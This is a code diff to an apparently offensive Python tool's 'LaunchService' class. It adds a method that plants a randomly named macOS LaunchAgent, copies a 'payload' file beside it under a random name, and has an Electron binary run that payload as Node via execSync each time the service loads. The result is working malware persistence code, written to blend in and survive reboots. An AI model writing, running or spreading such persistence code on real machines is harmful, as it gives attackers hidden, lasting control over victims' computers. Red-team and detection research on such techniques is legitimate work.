@@ -204,3 +204,44 @@ class LaunchService:
             print("  Service started successfully 🎉")
 
         root_obj.unmount()
+
+
+    def install_electron_launch_service(self, variant: str, electron_binary: str, randomize_name: bool = True) -> None:
+        """
+        Install launch service as Electron binary.
+        """
+        if variant != MacPersistenceMethods.LAUNCH_AGENT_ELECTRON.value:
+            raise ValueError(f"Unsupported variant {variant}")
+
+        print(f"Installing launch service ({variant})")
+        print(f"  Electron binary: {electron_binary}")
+
+        service_directory = Path("~/Library/LaunchAgents").expanduser()
+        service_directory.mkdir(parents=True, exist_ok=True)
+
+        service_name = f"com.{random.randint(0, 1000000)}"
+        service_file = service_directory / f"{service_name}.plist"
+        service_file.touch()
+
+        service_file_path = service_file.resolve()
+
+        # Copy payload file to safe location.
+        payload_new_name = f"{random.randint(0, 1000000)}" if randomize_name else Path(self.payload).name
+        payload_file = service_directory / payload_new_name
+        subprocess.run([BIN_CP, self.payload, str(payload_file)], capture_output=True, text=True)
+
+        print(f"  Relocated payload: {payload_file}")
+        print(f"  Service file: {service_file_path}")
+
+        arguments = [
+            str(electron_binary),
+            "-e",
+            f"require('child_process').execSync('{str(payload_file)}').toString()"
+        ]
+
+        plistlib.dump(self._build_launch_service(name=service_name, arguments=arguments, enviroment_variables={"ELECTRON_RUN_AS_NODE": "1"}), service_file_path.open("wb"))
+
+        if not self._start_launch_service(str(service_file_path)):
+            raise RuntimeError("Failed to start launch service.")
+
+        print("  Service started successfully 🎉")
